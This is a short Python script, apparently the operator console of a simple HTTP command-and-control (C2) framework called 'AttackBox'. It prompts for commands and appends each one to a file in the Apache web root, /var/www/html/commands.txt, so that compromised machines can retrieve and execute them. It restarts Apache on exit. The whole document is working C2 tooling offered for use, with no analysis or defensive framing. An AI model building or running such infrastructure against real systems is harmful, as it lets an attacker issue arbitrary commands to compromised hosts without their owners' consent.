import sys
import subprocess

print("""

  ___ _            _
 / __(_)_ __  _ __| |___
 \__ \ | '  \| '_ \ / -_)
 |___/_|_|_|_| .__/_\___|
  _  _ _____ |_|__ ___    ___ ___
 | || |_   _|_   _| _ \  / __|_  )
 | __ | | |   | | |  _/ | (__ / /
 |_||_| |_|   |_| |_|    \___/___|


Command Injector for AttackBox HTTP C2
""")
while True:
    f = open("/var/www/html/commands.txt", "a")
    print("\n")
    cmd = input("> ")
    print("\n")
    if cmd == "help":
        print("-" * 30)
        print("Input Commands To Be Retrieved and Executed by AttackBox Framework Machines.")
        print("Type 'Exit' to Close Script and Restart Apache")
        print("-" * 30)
    elif cmd == "exit":
        print("\n")
        print("[!] Closing Files and Restarting Apache")
        f.close()
        subprocess.call("service apache2 restart", shell=True)
        print("\n")
        print("[!] Exiting")
        sys.exit()
        print("\n")
    else:
        f.write(cmd + "\n")
        print("[*] Command Added!")
        print("\n")
